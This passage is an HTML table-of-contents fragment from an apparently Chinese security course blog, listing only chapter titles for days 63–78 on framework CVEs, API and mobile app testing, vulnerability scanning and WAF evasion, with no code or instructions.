href="#%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%89%E5%A4%A9-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Django-Flask-Node-JS-JQuery"><span class="nav-number">62.</span> <span class="nav-text">第六十三天 服务攻防-框架安全&amp;CVE复现&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%8F%8A%E6%A1%86%E6%9E%B6%E5%88%97%E8%A1%A8%EF%BC%9A"><span class="nav-number">62.0.0.1.</span> <span class="nav-text">中间件及框架列表：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E8%AF%AD%E8%A8%80%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%EF%BC%9A-1"><span class="nav-number">62.0.0.2.</span> <span class="nav-text">常见语言开发框架：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%A0%E8%8A%82%E5%86%85%E5%AE%B9%EF%BC%9A-9"><span class="nav-number">62.0.0.3.</span> <span class="nav-text">章节内容：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A-12"><span class="nav-number">62.0.0.4.</span> <span class="nav-text">前置知识：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%EF%BC%9A%E8%A7%81%E5%9B%BE"><span class="nav-number">62.0.0.4.1.</span> <span class="nav-text">应用服务安全测试流程：见图</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="nav-number">62.0.0.4.2.</span> <span class="nav-text">开发框架组件安全测试流程：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-37"><span class="nav-number">62.0.0.5.</span> <span class="nav-text">演示案例：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Django"><span class="nav-number">62.0.0.5.1.</span> <span class="nav-text">Django</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Flask-Jinja2-SSTI"><span class="nav-number">62.0.0.5.2.</span> <span class="nav-text">Flask Jinja2 SSTI</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#jQuery"><span class="nav-number">62.0.0.5.3.</span> <span class="nav-text">jQuery</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Node-js"><span class="nav-number">62.0.0.5.4.</span> <span class="nav-text">Node.js</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E5%85%AD%E5%8D%81%E5%9B%9B%E5%A4%A9-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0Apache-shiro-Apache-Solr"><span class="nav-number">63.</span> <span class="nav-text">第六十四天 服务攻防-框架安全&amp;CVE复现Apache shiro&amp;Apache Solr</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-43"><span class="nav-number">63.0.0.1.</span> <span class="nav-text">#知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%A0%E8%8A%82%E5%86%85%E5%AE%B9%EF%BC%9A-10"><span class="nav-number">63.0.0.2.</span> <span class="nav-text">#章节内容：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A-13"><span class="nav-number">63.0.0.3.</span> <span class="nav-text">#前置知识：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ApacheShiro-%E7%BB%84%E4%BB%B6%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8"><span class="nav-number">63.0.0.4.</span> <span class="nav-text">ApacheShiro-组件框架安全</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ApacheSolr-%E7%BB%84%E4%BB%B6%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8"><span class="nav-number">63.0.0.5.</span> <span class="nav-text">ApacheSolr-组件框架安全</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC65%E5%A4%A9-API%E5%AE%89%E5%85%A8-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService"><span class="nav-number">64.</span> <span class="nav-text">第65天 API安全-接口安全&amp;WebPack&amp;REST&amp;SOAP&amp;WSDL&amp;WebService</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-5"><span class="nav-number">64.0.1.</span> <span class="nav-text">知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AE%B9%E7%82%B9%EF%BC%9A-1"><span class="nav-number">64.0.1.1.</span> <span class="nav-text">内容点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A5%E5%8F%A3%E6%95%B0%E6%8D%AE%E5%8C%85%EF%BC%9A"><span class="nav-number">64.0.1.2.</span> <span class="nav-text">接口数据包：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC66%E5%A4%A9-API%E5%AE%89%E5%85%A8-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-%E9%98%BF%E9%87%8C%E4%BA%91KEY-postman-DVWS-XEE-%E9%89%B4%E6%9D%83-%E6%B3%84%E9%9C%B2"><span class="nav-number">65.</span> <span class="nav-text">第66天 API安全-接口安全&amp;阿里云KEY%postman&amp;DVWS&amp;XEE&amp;鉴权&amp;泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98-Dvws%E4%B8%96%E6%98%AF-%E9%89%B4%E6%9D%83-OXE"><span class="nav-number">65.0.0.1.</span> <span class="nav-text">安全问题-Dvws世是&amp;鉴权&amp;OXE</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E6%96%B9%E5%90%91%E8%BF%9D%E6%B3%95APP%E6%89%93%E5%8C%85%E6%8E%A5%E5%8F%A3%E5%88%86%E6%9E%90"><span class="nav-number">65.0.0.1.1.</span> <span class="nav-text">应用方向违法APP打包接口分析</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC67%E5%A4%A9-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F"><span class="nav-number">66.</span> <span class="nav-text">第67天 APP攻防-Frida反证书抓包&amp;移动安全系统&amp;资产提取&amp;评估扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-44"><span class="nav-number">66.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%A0%E8%8A%82%E7%82%B9%EF%BC%9A"><span class="nav-number">66.0.0.2.</span> <span class="nav-text">章节点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E7%82%B9%EF%BC%9A"><span class="nav-number">66.0.0.3.</span> <span class="nav-text">核心点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-38"><span class="nav-number">66.0.0.4.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%9C%A8-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-Appinfoscanner"><span class="nav-number">66.0.0.5.</span> <span class="nav-text">内在-资产提取-Appinfoscanner</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%9C%A8-%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0-MobsF-mobexler"><span class="nav-number">66.0.0.6.</span> <span class="nav-text">内在-安全评估-MobsF&amp;mobexler</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%96%E5%9C%A8-%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-frida-server-rocapture"><span class="nav-number">66.0.0.7.</span> <span class="nav-text">外在-证书抓包-frida-server&amp;rocapture</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC68%E5%A4%A9-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="nav-number">67.</span> <span class="nav-text">第68天 APP攻防-Xposed&amp;Frida&amp;Hook&amp;证书校验&amp;反代理&amp;代理转发</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-45"><span class="nav-number">67.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%A0%E8%8A%82%E7%82%B9%EF%BC%9A-1"><span class="nav-number">67.0.0.2.</span> <span class="nav-text">章节点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E7%82%B9%EF%BC%9A-1"><span class="nav-number">67.0.0.3.</span> <span class="nav-text">核心点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-39"><span class="nav-number">67.0.0.4.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E4%BB%A3%E7%90%86%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="nav-number">67.0.0.5.</span> <span class="nav-text">反代理绕过：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="nav-number">67.0.0.6.</span> <span class="nav-text">证书校验绕过：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC69%E5%A4%A9-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6"><span class="nav-number">68.</span> <span class="nav-text">第69天 APP攻防-反编译&amp;查壳脱壳&amp;重打包签名&amp;修改次数会员版权限制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-46"><span class="nav-number">68.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%A0%E8%8A%82%E7%82%B9%EF%BC%9A-2"><span class="nav-number">68.0.0.2.</span> <span class="nav-text">章节点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E7%82%B9%EF%BC%9A-2"><span class="nav-number">68.0.0.3.</span> <span class="nav-text">核心点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-40"><span class="nav-number">68.0.0.4.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%9F%E8%83%BD%E4%BF%AE%E6%94%B9-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%AC%A1%E6%95%B0-%E4%BC%9A%E5%91%98"><span class="nav-number">68.0.0.5.</span> <span class="nav-text">#功能修改-反编译&amp;次数&amp;会员</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%9F%E8%83%BD%E4%BF%AE%E6%94%B9-%E5%8F%8D%E7%BC%96%E8%AF%91-%E5%9B%BE%E6%A0%87-%E4%BF%A1%E6%81%AF"><span class="nav-number">68.0.0.6.</span> <span class="nav-text">功能修改-反编译&amp;图标&amp;信息</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC70%E5%A4%A9-APP%E6%94%BB%E9%98%B2-%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E8%A7%A3%E5%8C%85%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%95%B0%E6%8D%AE%E6%8A%93%E5%8C%85-APK%E4%BF%A1%E6%81%AF%E8%B5%84%E6%BA%90%E6%8F%90%E5%8F%96"><span class="nav-number">69.</span> <span class="nav-text">第70天 APP攻防-微信小程序&amp;解包反编译&amp;数据抓包&amp;APK信息资源提取</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-47"><span class="nav-number">69.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E7%82%B9%EF%BC%9A-3"><span class="nav-number">69.0.0.2.</span> <span class="nav-text">核心点：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-41"><span class="nav-number">69.0.1.</span> <span class="nav-text">演示案例：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#APP-APK-%E4%BF%A1%E6%81%AF%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96"><span class="nav-number">69.0.1.1.</span> <span class="nav-text">APP&amp;APK-信息资源文件提取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9C%9F%E6%9C%BA-%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%95%B0%E6%8D%AE%E6%8A%93%E5%8C%85"><span class="nav-number">69.0.1.2.</span> <span class="nav-text">微信小程序真机&amp;模拟器数据抓包</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-PC-%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%88%86%E5%8C%85%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="nav-number">69.0.1.3.</span> <span class="nav-text">微信小程序-PC&amp;模拟器分包反编译</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC71%E5%A4%A9-APP%E6%94%BB%E9%98%B2-%E5%AE%9E%E6%88%98%E6%8B%BF%E4%B8%8B-Springboot%E6%9C%AA%E6%8E%88%E6%9D%83-HeapDump%E6%8F%90%E5%8F%96-OSS%E5%88%A9%E7%94%A8"><span class="nav-number">70.</span> <span class="nav-text">第71天 APP攻防-实战拿下&amp;Springboot未授权&amp;HeapDump提取&amp;OSS利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A%EF%BC%9A"><span class="nav-number">70.0.0.1.</span> <span class="nav-text">安全测试报告：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BD%95%E5%83%8F%E5%89%AA%E8%BE%91%E4%B8%A5%E9%87%8D%E8%BF%99%E9%87%8C%E5%8F%AA%E7%AE%80%E5%8D%95%E8%AF%B4%E4%B8%80%E4%B8%8B%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="nav-number">70.0.0.2.</span> <span class="nav-text">录像剪辑严重这里只简单说一下思路：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC72%E5%A4%A9-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6-%E8%81%94%E5%8A%A8-Goby-Afrog-Xray-Awvs-Vulmap"><span class="nav-number">71.</span> <span class="nav-text">第72天 漏洞发现-Web框架中间件&amp;联动&amp;Goby&amp;Afrog&amp;Xray&amp;Awvs&amp;Vulmap</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-48"><span class="nav-number">71.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%A0%E8%8A%82%E7%82%B9%EF%BC%9A-3"><span class="nav-number">71.0.0.2.</span> <span class="nav-text">章节点：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-42"><span class="nav-number">71.0.1.</span> <span class="nav-text">演示案例：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A1%B9%E7%9B%AE%E8%B5%84%E6%BA%90%EF%BC%9A"><span class="nav-number">71.0.1.1.</span> <span class="nav-text">项目资源：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E7%89%B9%E6%89%AB%EF%BC%9A"><span class="nav-number">71.0.1.2.</span> <span class="nav-text">其他特扫：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC73%E5%A4%A9-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%B8%AD%E9%97%B4%E4%BB%B6-Nuclei-Nessus-Nexpose-Goby"><span class="nav-number">72.</span> <span class="nav-text">第73天 漏洞发现-操作系统服务中间件&amp;Nuclei&amp;Nessus.&amp;Nexpose&amp;Goby</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-49"><span class="nav-number">72.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%A0%E8%8A%82%E7%82%B9%EF%BC%9A-4"><span class="nav-number">72.0.0.2.</span> <span class="nav-text">章节点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-43"><span class="nav-number">72.0.0.3.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A1%B9%E7%9B%AE%E8%B5%84%E6%BA%90%EF%BC%9A-1"><span class="nav-number">72.0.0.4.</span> <span class="nav-text">项目资源：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B1-Nessus-Nexpose%E6%BC%8F%E6%89%AB%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E"><span class="nav-number">72.0.0.5.</span> <span class="nav-text">案例1-Nessus&amp;Nexpose漏扫操作系统漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B2-Goby-Nucle%E6%BC%8F%E6%89%AB%E7%B3%BB%E7%BB%9F-%E6%9C%8D%E5%8A%A1-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="nav-number">72.0.0.6.</span> <span class="nav-text">案例2-Goby&amp;Nucle漏扫系统&amp;服务&amp;中间件漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B3-Nuclei%E6%BC%8F%E6%89%AB%E7%89%B9%E5%AE%9A%E8%B5%84%E4%BA%A7-%E6%A8%A1%E7%89%88%E5%AF%BC%E5%85%A5-%E6%9C%80%E6%96%B0%E6%BC%8F%E6%B4%9E"><span class="nav-number">72.0.0.7.</span> <span class="nav-text">案例3-Nuclei漏扫特定资产&amp;模版导入&amp;最新漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B4-FofaMAP%E6%88%B7-Nucle%E6%BC%8F%E6%89%AB%E8%87%AA%E5%8A%A8%E5%8C%96%E7%89%B9%E5%AE%9A%E8%B5%84%E4%BA%A7%E6%BC%8F%E6%B4%9E"><span class="nav-number">72.0.0.8.</span> <span class="nav-text">案例4-FofaMAP户&amp;Nucle漏扫自动化特定资产漏洞</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC74%E5%A4%A9-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Web%E6%A1%86%E6%9E%B6%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%8F%92%E4%BB%B6-BurpSuite-%E6%B5%8F%E8%A7%88%E5%99%A8-%E8%A2%AB%E5%8A%A8-%E4%B8%BB%E5%8A%A8%E6%8E%A2%E9%92%88"><span class="nav-number">73.</span> <span class="nav-text">第74天 漏洞发现-Web框架中间件插件&amp;BurpSuite&amp;浏览器&amp;被动&amp;主动探针</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-50"><span class="nav-number">73.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%A0%E8%8A%82%E7%82%B9%EF%BC%9A-5"><span class="nav-number">73.0.0.2.</span> <span class="nav-text">章节点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-44"><span class="nav-number">73.0.0.3.</span> <span class="nav-text">演示案例：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC75%E5%A4%A9-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-MSF%E6%A1%86%E6%9E%B6-CVE-CNVD-POC-EXP%E7%9B%91%E6%8E%A7-%E6%9F%A5%E6%89%BE-%E6%95%B4%E7%90%86"><span class="nav-number">74.</span> <span class="nav-text">第75天 漏洞利用-MSF框架&amp;CVE&amp;CNVD&amp;POC&amp;EXP监控&amp;查找&amp;整理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-51"><span class="nav-number">74.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E8%B5%84%E6%BA%90%EF%BC%9A"><span class="nav-number">74.0.0.2.</span> <span class="nav-text">漏洞资源：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-45"><span class="nav-number">74.0.0.3.</span> <span class="nav-text">演示案例：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC76%E5%A4%A9-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95"><span class="nav-number">75.</span> <span class="nav-text">第76天 WAF攻防-信息收集&amp;识别&amp;被动探针&amp;代理池&amp;仿指纹&amp;白名单</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-52"><span class="nav-number">75.0.1.</span> <span class="nav-text">知识点：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%A0%E8%8A%82%E7%82%B9%EF%BC%9A-6"><span class="nav-number">75.0.1.1.</span> <span class="nav-text">章节点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-46"><span class="nav-number">75.0.1.2.</span> <span class="nav-text">演示案例：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%83%E5%8D%81%E4%B8%83%E5%A4%A9WAF%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6-%E4%BB%A3%E7%A0%81%E5%85%8D%E6%9D%80-%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86-%E4%BC%A0%E5%8F%82"><span class="nav-number">76.</span> <span class="nav-text">第七十七天WAF攻防-权限控制&amp;代码免杀&amp;异或运算&amp;变量覆盖&amp;混淆加密&amp;传参</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-53"><span class="nav-number">76.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%A0%E8%8A%82%E7%82%B9%EF%BC%9A-7"><span class="nav-number">76.0.0.2.</span> <span class="nav-text">章节点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A1%A5%E5%85%85%E7%82%B9%EF%BC%9A"><span class="nav-number">76.0.0.3.</span> <span class="nav-text">补充点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-47"><span class="nav-number">76.0.0.4.</span> <span class="nav-text">演示案例：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC78%E5%A4%A9-WAF%E6%94%BB%E9%98%B2-%E8%8D%9A%E5%88%80-%E5%86%B0%E8%9D%8E-%E5%93%A5%E6%96%AF%E6%8B%89-%E6%B5%81%E9%87%8F%E9%80%9A%E8%AE%AF-%E7%89%B9%E5%BE%81%E7%BB%95%E8%BF%87-%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%88%B6-%E6%84%9F%E7%9F%A5"><span class="nav-number">77.</span> <span class="nav-text">第78天 WAF攻防-荚刀&amp;冰蝎&amp;哥斯拉&amp;流量通讯&amp;特征绕过&amp;检测反制&amp;感知</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-54"><span class="nav-number">77.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%A0%E8%8A%82%E7%82%B9%EF%BC%9A-8"><span class="nav-number">77.0.0.2.</span> <span class="nav-text">章节点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-48"><span class="nav-number">77.0.0.3.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8B%93%E5%B1%95-%E5%86%B0%E8%9D%8E%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="nav-number">77.0.0.4.</span> <span class="nav-text">拓展 冰蝎流量特征</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">77.0.0.5.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" 